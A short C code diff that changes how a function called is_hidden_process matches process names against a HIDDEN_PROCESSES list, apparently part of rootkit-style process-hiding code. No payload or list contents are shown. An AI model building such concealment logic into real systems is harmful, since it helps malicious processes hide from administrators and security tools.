@@ -164,8 +164,7 @@ int is_hidden_process(char *proc_name)
     for (i = 0; i < sizeof(HIDDEN_PROCESSES) / sizeof(char *); i++)
     {
         // Hidden process is found
-        // if (strcmp(proc_name, HIDDEN_PROCESSES[i]) == 0)
-        if (strstr(proc_name, HIDDEN_PROCESSES[i]) != NULL && strstr(HIDDEN_PROCESSES[i], proc_name) != NULL)
+        if (strcmp(proc_name, HIDDEN_PROCESSES[i]) == 0)
         {
             return 1;
         }
